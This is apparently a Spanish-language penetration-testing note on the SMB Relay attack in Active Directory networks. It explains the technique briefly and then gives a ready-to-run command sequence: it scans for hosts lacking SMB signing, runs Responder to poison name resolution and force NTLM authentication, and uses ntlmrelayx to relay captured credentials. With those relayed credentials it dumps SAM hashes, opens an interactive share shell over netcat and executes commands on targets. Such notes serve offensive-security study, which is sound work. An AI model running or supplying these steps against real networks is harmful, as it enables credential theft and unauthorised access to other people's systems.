# SMB Relay 

Tags: #AD #Attacks #SMBRelay 

El **SMB Relay** (también conocido como **Ataque de relé SMB**) es una técnica utilizada en redes Windows cuando el SMB no esta firmado o no se encuentra forzado 'obligado' en el target, particularmente en entornos que emplean **Active Directory (AD)**, para tomar los **hashes de autenticación** de los usuarios y usarlos para autenticar conexiones en otros equipos, o incluso obtener acceso a servicios y recursos en la red sin necesidad de conocer las contraseñas en texto claro. Las credenciales de los usuarios deben ser de 'admin' en dispositivos con cualquier valor real. 

Este ataque se basa en **capturar** y **retransmitir** solicitudes de autenticación SMB a otros sistemas, lo que permite al atacante **suplantar** al usuario legítimo y autenticarse en el sistema de destino, sin necesidad de descifrar las credenciales.

```bash 
1. Verificar los hosts que no tienen firmado el SMB 'Message signing enabled but not required' 
❯ nmap --script=smb2-security-mode.nse -p445 IP/24 -Pn   

2. Modificar el archivo del 'Responder.conf', cambiar el SMB y HTTP a 'Off'
❯ nvim /etc/responder.Responder.conf

3. Ejecutar el responder y verificar que se aplicaron los cambios 
❯ responder -I eth0 -dwPv    
	# d --DHCP-DNS = Inyecta un servidor DNS en el DHCP reponder
	# w --wpad = Inicia el WPAD proxy server
	# P --ProxyAuth = Fuerza la autenticacion NTLM para el proxy.   
	# v = Verbosidad  

4. Ejecutar la herramienta para aplicar el SMB Relay. Si el ataque fue exitoso, la herramienta nos mostrara los hashes de la SAM   
❯ impacket-ntlmrelayx -tf targets.txt -smb2support
❯ ntlmrelayx.py -tf targets.txt -smb2support              # La versión v0.9.19 es funcional 
	# tf = Target file  

❯ ntlmrelayx.py -tf targets.txt -smb2support -i  
	# i = Obtener una consola interactiva a traves del sistema de archivos en lugar de mostrar los hashes de la SAM 

Podemos usar 'Netcat' para ingresar a la carpeta compartida que nos muestra el comando anterior 
❯ nc 127.0.0.1 11000     # Conexion interactiva a le 'Shared' por el localhost y el puerto 11000
	❯ shares            # Muestra los directorios compartidos 
	❯ use C$            # Ingresamos al directorio 'C:'
	❯ ls                # Listamos lo que se encuentra en el directorio 

❯ ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
	# c = Ejecutar un comando  
```